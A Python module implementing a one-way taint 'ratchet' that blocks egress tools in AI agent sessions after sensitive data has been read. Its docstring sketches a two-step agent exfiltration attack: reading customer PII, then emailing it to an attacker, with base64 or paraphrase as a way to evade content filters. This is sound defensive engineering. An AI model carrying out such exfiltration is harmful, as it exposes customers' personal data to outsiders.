"""DLP attribute ratchet — taint tracking for agent sessions.

The rule is simple and one-directional: once a session has *observed* data at
some sensitivity level, its high-water mark rises to that level and never
falls for the life of the session. Egress tools are then gated on the mark.

This is what stops the classic two-step exfiltration:

    step 1: read_customer_pii(C-1003)      -> allowed, mark rises to PCI
    step 2: send_email(to=attacker, body=<the PII>) -> structurally denied

Note that step 2 is denied *regardless of what the body contains*. We are not
pattern-matching for SSNs in the outgoing text, which an attacker can trivially
evade with base64 or a paraphrase. We deny on the basis that this session is
no longer clean. That distinction is the whole reason this is a ratchet and
not a content filter.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from .domain import Sensitivity, ToolSpec


@dataclass
class RatchetEvent:
    """One upward movement of the high-water mark."""

    at_tool: str
    from_level: str
    to_level: str
    call_id: str

    def to_dict(self) -> dict[str, Any]:
        return {"tool": self.at_tool, "from": self.from_level,
                "to": self.to_level, "call_id": self.call_id}


@dataclass
class DLPRatchet:
    """Per-session taint state.

    `egress_ceiling` is the highest sensitivity a session may still export
    after. Anything above it and egress is refused.
    """

    egress_ceiling: Sensitivity = Sensitivity.CONFIDENTIAL
    mark: Sensitivity = Sensitivity.PUBLIC
    history: list[RatchetEvent] = field(default_factory=list)

    # ── observation ─────────────────────────────────────────────────

    def observe(self, spec: ToolSpec, call_id: str = "") -> RatchetEvent | None:
        """Record that a tool returned data at `spec.reads`.

        Returns the event if the mark moved, else None. Called *after* a tool
        succeeds -- reading is what taints, not attempting to read.
        """
        if spec.reads <= self.mark:
            return None
        ev = RatchetEvent(spec.name, self.mark.label, spec.reads.label, call_id)
        self.mark = spec.reads
        self.history.append(ev)
        return ev

    # ── enforcement ─────────────────────────────────────────────────

    def blocks_egress(self, spec: ToolSpec) -> bool:
        return spec.egress and self.mark > self.egress_ceiling

    def explain(self, spec: ToolSpec) -> str:
        origin = self.history[-1].at_tool if self.history else "an earlier call"
        return (
            f"DLP ratchet: this session is tainted at '{self.mark.label}' "
            f"(raised by {origin}), which exceeds the egress ceiling of "
            f"'{self.egress_ceiling.label}'. Tool '{spec.name}' leaves the "
            f"trust boundary, so it is refused for the rest of the session."
        )

    # ── introspection ───────────────────────────────────────────────

    def is_clean(self) -> bool:
        return self.mark <= self.egress_ceiling

    def to_dict(self) -> dict[str, Any]:
        return {
            "mark": self.mark.label,
            "mark_level": int(self.mark),
            "ceiling": self.egress_ceiling.label,
            "ceiling_level": int(self.egress_ceiling),
            "clean": self.is_clean(),
            "events": [e.to_dict() for e in self.history],
        }

    def reset(self) -> None:
        self.mark = Sensitivity.PUBLIC
        self.history.clear()
